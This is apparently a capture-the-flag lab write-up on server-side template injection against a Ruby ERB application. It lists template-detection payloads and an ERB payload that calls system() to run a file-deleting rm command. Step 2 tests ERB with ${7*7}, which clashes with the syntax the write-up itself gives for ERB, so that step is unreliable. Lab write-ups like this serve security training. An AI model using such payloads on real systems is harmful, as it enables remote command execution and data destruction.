# Lab: Basic server-side template injection

## Description
This lab contains a server-side template injection vulnerability. User-supplied input is embedded into a template in an unsafe way.

## Analysis
The application has a "message" parameter that is reflected on the page. If the application uses a template engine to render this message, we might be able to inject template directives.

Common template engine detection payloads:
- `{{7*7}}` (Jinja2, Twig, etc. - Result: 49)
- `${7*7}` (ERB, FreeMarker, etc. - Result: 49)
- `<%= 7*7 %>` (ERB - Result: 49)

In this lab, the application uses ERB (Ruby).

## Exploitation
I need to execute a command to delete `carlos`.

### Steps
1. Navigate to a product and click "Edit".
2. Change the message to `${7*7}`. If it renders as `49`, it's vulnerable.
3. For ERB, I can use `system()` or `` ` `` to execute commands.
4. Payload to delete carlos: `<%= system("rm /home/carlos/morale.txt") %>`.

## Payload
```erb
<%= system("rm /home/carlos/morale.txt") %>
```

## Takeaways
- SSTI occurs when an application embeds user input directly into a template instead of passing it as data.
- Identifying the template engine is the first step in exploitation.
